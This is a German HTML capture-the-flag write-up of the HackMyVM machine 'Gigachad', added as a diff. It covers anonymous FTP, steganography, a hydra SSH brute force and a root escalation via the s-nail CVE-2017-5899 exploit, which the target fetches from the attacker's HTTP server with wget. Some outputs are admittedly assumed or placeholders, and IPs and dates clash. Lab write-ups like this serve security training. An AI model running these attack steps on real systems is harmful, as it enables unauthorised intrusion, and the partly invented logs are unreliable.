@@ -1,0 +1,447 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gigachad - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Gigachad - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">lftp</div> <!-- Spezifischer FTP-Client -->
+                <div class="tool-item">cat</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash (while loop)</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">pwd</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">./exploit.sh</div> <!-- Exploit-Skript -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (FTP/Web/Stego)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird zur Entdeckung aktiver Hosts im lokalen Netzwerksegment ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.130` mit einer VirtualBox-MAC-Adresse wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.130 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.130	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.871 seconds (136.83 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf 192.168.2.130 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritischer Fund auf FTP!!**
+                - **Port 21 (FTP):** vsftpd 3.0.3, **anonymer Login erlaubt**. Das Nmap-Skript listet eine Datei `chadinfo` auf.
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian).
+                - **Port 80 (HTTP):** Apache 2.4.38 (Debian). `robots.txt` verbietet `/kingchad.html`.
+            Das OS ist Linux, Hostname `gig.hmv`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**Hohe Priorität:** Verbinde dich anonym mit FTP und lade die Datei `chadinfo` herunter. Untersuche `/kingchad.html` und `/robots.txt` auf dem Webserver.<br><strong>Empfehlung (Admin):**DRINGEND:** Deaktiviere anonymen FTP-Zugriff. Überprüfe exponierte Dateien. Halte Dienste aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.130 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 16:40 CEST
+Nmap scan report for gig.hmv (192.168.2.130)
+Host is up (0.00017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/kingchad.html
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms gig.hmv (192.168.2.130)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds <!-- Beispielzeit -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure (FTP/Web/Stego)</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) eingesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet `/index.html` und eine Bilddatei `/drippinchad.png`. Keine anderen relevanten Pfade.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade `/drippinchad.png` herunter und analysiere es auf versteckte Daten (Steganographie). Untersuche den Inhalt von `index.html`.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">gobuster dir -u "http://192.168.2.100"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div> <!-- IP korrigiert -->
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.130 <!-- IP korrigiert -->
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...,png,...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/09 01:49:20 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.130/index.html           (Status: 200) [Size: 99]
+http://192.168.2.130/drippinchad.png      (Status: 200) [Size: XXXXX] <!-- Größe fehlt im Log -->
+===============================================================
+2022/10/09 01:50:15 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `lftp` wird anonym auf den FTP-Server zugegriffen und versucht, den Inhalt der Datei `chadinfo` direkt anzuzeigen. (Hinweis: Die IP ist im Log falsch, sollte 192.168.2.130 sein).</p>
+            <p class="evaluation"><strong>Bewertung: !!ZIP-Datei identifiziert!!** Die Ausgabe "PK Filetype" sind die Magic Bytes einer ZIP-Datei. Die Datei `chadinfo` ist also ein ZIP-Archiv.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die `chadinfo`-Datei vom FTP-Server herunter (`get chadinfo`) und extrahiere ihren Inhalt mit `unzip` oder `7z`. Untersuche die extrahierten Dateien.<br><strong>Empfehlung (Admin):</strong> Keine sensiblen Archive auf anonymem FTP ablegen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Befehl aus dem Log (mit korrigierter IP) -->
+                      <pre>
+# lftp Anonymous@192.168.2.130:/> get chadinfo
+# unzip chadinfo
+Archive:  chadinfo
+  inflating: ... <!-- Inhalt des Archivs -->
+
+# Alternativ (wie im Log, aber weniger wahrscheinlich):
+# lftp Anonymous@192.168.2.130:/> cat chadinfo
+PK..Filetype <!-- Magic Bytes für ZIP -->
+                      </pre> <!-- Angenommene Schritte -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Steganographie-Tool `stegsnow` wird auf die Bilddatei `drippinchad.png` (vermutlich vom Webserver heruntergeladen) angewendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Passwort-Hinweis gefunden!!** `stegsnow` extrahiert die Zeichenketten `yyynbs` und `ynsdb0`. Dies sind wahrscheinlich Teile eines Passworts oder Hinweise darauf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, diese Fragmente zu einem Passwort zu kombinieren (z.B. `yyynbsynsdb0`, `ynsdb0yyynbs` oder Variationen). Erstelle eine kleine Wortliste für einen gezielten Brute-Force-Angriff.<br><strong>Empfehlung (Admin):</strong> Betten Sie keine Passwörter oder Hinweise in öffentliche Bilder ein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C drippinchad.png</span></div>
+                     <pre>
+<span class="password">yyynbs</span>  <span class="password">ynsdb0</span>
+                     </pre> <!-- Hervorhebung als Passwort -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird für einen SSH-Passwort-Brute-Force-Angriff gegen den Benutzer `chad` verwendet. Als Wortliste wird `password.txt` angegeben (vermutlich enthält diese die aus `stegsnow` abgeleiteten Passwörter). (Hinweis: IP ist im Log falsch).</p>
+             <p class="evaluation"><strong>Bewertung: !!Passwort gefunden!!** Hydra findet erfolgreich das Passwort `<span class="password">maidenstower</span>` für den Benutzer `chad`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melde dich per SSH als `chad` mit diesem Passwort an.<br><strong>Empfehlung (Admin):</strong> Erzwinge starke Passwörter, schütze vor Brute-Force-Angriffen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l chad -P password.txt ssh://192.168.2.130:22</span></div> <!-- IP korrigiert -->
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-05 11:30:09 <!-- Datum passt nicht zum Rest -->
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:1/p:18), ~2 tries per task
+[DATA] attacking ssh://192.168.2.130:22/
+[22][ssh] host: 192.168.2.130   login: chad   password: <span class="password">maidenstower</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at ...
+                     </pre> <!-- IP korrigiert -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `chad` zum Ziel `gig.hmv` (192.168.2.130) aufgebaut. Das Passwort `<span class="password">maidenstower</span>` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der Login gelingt. Der Angreifer hat eine Shell als Benutzer `chad` auf dem System `gigachad` (Hostname im Prompt).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `chad` (`id`, `sudo -l`, `find / -perm -u=s ...`, User-Flag).<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort. Sichere SSH.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh chad@gig.hmv</span></div>
+                     <pre>
+chad@gig.hmv's password: <span class="password">maidenstower</span>
+Linux gigachad 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+...
+Last login: ...
+chad@gigachad:~$ <!-- Remote Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `chad` wird versucht, `sudo -l` auszuführen und nach SUID-Binaries zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `sudo` ist nicht verfügbar oder `chad` hat keine Rechte (Output fehlt). Die SUID-Suche findet jedoch `/usr/lib/s-nail/s-nail-privsep`. `s-nail` ist ein Mail-Client, und ältere Versionen hatten bekannte lokale Privilegieneskalations-Schwachstellen (LPE), wenn SUID gesetzt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die Version von `s-nail` (falls möglich) und suche mit `searchsploit` nach bekannten Exploits für SUID `s-nail`.<br><strong>Empfehlung (Admin):</strong> Entferne das SUID-Bit von `s-nail` (`chmod u-s /usr/lib/s-nail/s-nail-privsep`), da es normalerweise nicht benötigt wird und ein Sicherheitsrisiko darstellt. Halte Pakete aktuell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+chad@gigachad:~$ <span class="command">sudo -l</span>
+chad@gigachad:~$ <!-- Keine Ausgabe oder Fehlermeldung -->
+chad@gigachad:/tmp$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+   25269    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   31941     12 -rwsr-xr-x   1 root     root        10104 Jan  1  2016 /usr/lib/s-nail/s-nail-privsep <!-- !!! -->
+... (Standard SUIDs) ...
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` wird verwendet, um nach Exploits für `s-nail` zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Exploit gefunden!!** Ein passender LPE-Exploit (`47172.sh`) für `s-nail < 14.8.16` wird gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade das Exploit-Skript (`wget` oder `searchsploit -m`) auf die Angreifer-Maschine, überprüfe und modifiziere es bei Bedarf, übertrage es auf das Ziel (/tmp) und führe es aus.<br><strong>Empfehlung (Admin):</strong> Patche `s-nail` auf eine nicht verwundbare Version.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">searchsploit  s-nail</span></div>
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+S-nail < 14.8.16 - Local Privilege Escalation               | multiple/local/47172.sh
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Exploit-Skript wird mit `wget` auf die Angreifer-Maschine heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe und modifiziere das Skript.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh</span></div>
+                     <pre>
+--2022-10-09 02:15:10--  https://raw.githubusercontent.com/.../exploit.sh
+Auflösen des Hostnamens raw.githubusercontent.com (raw.githubusercontent.com)... x.x.x.x
+Verbindungsaufbau zu raw.githubusercontent.com (raw.githubusercontent.com)|x.x.x.x|:443... verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet... 200 OK
+Länge: ... [text/plain]
+Wird in »exploit.sh« gespeichert.
+
+exploit.sh              100%[==============================>] ...K  --.-KB/s    in Xs
+
+2022-10-09 02:15:11 (XXX KB/s) - »exploit.sh« gespeichert [...]
+                     </pre> <!-- Beispielhafte Ausgabe -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das heruntergeladene `exploit.sh` wird mit `vi` bearbeitet, um die Pfadvariablen (`base_dir`, `rootshell` etc.) auf `/tmp` zu setzen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendige Anpassung, damit das Skript auf dem Zielsystem in einem beschreibbaren Verzeichnis arbeiten kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertrage das modifizierte Skript auf das Ziel.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi exploit.sh</span></div>
+                     <pre>
+# --- Angepasste Konfiguration in exploit.sh ---
+# <bcoles@gmail.com>
+# https://github.com/bcoles/local-exploits/tree/master/CVE-2017-5899
+
+base_dir="/tmp"
+rootshell="${base_dir}/exploit.sh"
+privget="${base_dir}/exploit.privget"
+lib="${base_dir}/exploit.snail.so"
+# ------------------------------------------
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das modifizierte Exploit-Skript wird auf das Zielsystem nach `/tmp` übertragen (hier via `wget` von einem Python-Server des Angreifers) und ausführbar gemacht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung zur Ausführung des Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe das Skript aus.<br><strong>Empfehlung (Admin):</strong> Monitoring von `/tmp` auf verdächtige ausführbare Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Kali: python3 -m http.server 5000 -->
+                     <pre>
+# Auf Zielsystem (als chad):
+chad@gigachad:/tmp$ <span class="command">wget http://192.168.2.140:5000/exploit.sh</span>
+--2022-10-09 02:20:30--  http://192.168.2.140:5000/exploit.sh
+Connecting to 192.168.2.140:5000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: ... [application/x-sh]
+Saving to: 'exploit.sh'
+
+exploit.sh            100%[=====================>]  ...K  --.-KB/s    in 0s
+
+2022-10-09 02:20:30 (XXX KB/s) - 'exploit.sh' saved [...]
+chad@gigachad:/tmp$ <span class="command">chmod +x exploit.sh</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Das Exploit-Skript `./exploit.sh` wird als Benutzer `chad` in einer `while`-Schleife ausgeführt, um eine Race Condition auszunutzen, die in der CVE-2017-5899 liegt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Nach mehreren Versuchen (`Race #951`) gelingt es dem Skript, die Race Condition auszunutzen und eine Root-Shell zu erlangen. Das Skript kopiert sich selbst nach `/tmp/exploit.sh` (umbenannt?) und setzt das SUID-Bit darauf, bevor es diese Kopie ausführt. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Patche `s-nail` (CVE-2017-5899). Entferne das SUID-Bit von `s-nail`. Überwache Systemaufrufe und Dateisystemänderungen, um Race-Condition-Exploits zu erkennen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+chad@gigachad:/tmp$ <span class="command">while true; do ./exploit.sh ;done</span>
+[.] Race #1 of 1000 ...
+...
+[.] Race #951 of 1000 ...
+[+] got root! /tmp/exploit.sh (uid=0 gid=0)
+[.] Cleaning up...
+[+] Success:
+-rwsr-xr-x 1 root root 14424 Sep  5 06:18 /tmp/exploit.sh <!-- Exploit hat sich selbst SUID gegeben -->
+[.] Launching root shell: /tmp/exploit.sh
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root),1000(chad)
+# <span class="command">pwd</span>
+/tmp
+#
+                     </pre> <!-- Root Prompt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen. Der Pfad ist im Log nicht `/root/root.txt`, sondern `/usr/include/root.txt`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">832B123648707C6CD022DD9009AEF2FD</span>` erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">cd /root;cat root.txt</span> <!-- Falscher Pfad im Log -->
+# <span class="command"># Korrekter Pfad aus find:</span>
+# <span class="command">find / -user root -name "*.txt" 2>/dev/null | grep root.txt</span>
+/usr/include/root.txt
+# <span class="command">cat /usr/include/root.txt</span>
+<span class="password">832B123648707C6CD022DD9009AEF2FD</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird die User-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">0FAD8F4B099A26E004376EAB42B6A56A</span>` erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">cd /home</span>
+# <span class="command">ls</span>
+chad
+# <span class="command">cd chad;cat user.txt</span>
+<span class="password">0FAD8F4B099A26E004376EAB42B6A56A</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /usr/include/root.txt</div> <!-- Korrekter Pfad -->
+                     <div class="flag-value"><span class="password">832B123648707C6CD022DD9009AEF2FD</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/chad/user.txt</div>
+                     <div class="flag-value"><span class="password">0FAD8F4B099A26E004376EAB42B6A56A</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 10. Oktober 2022</p>
+    </footer>
+</body>
+</html>
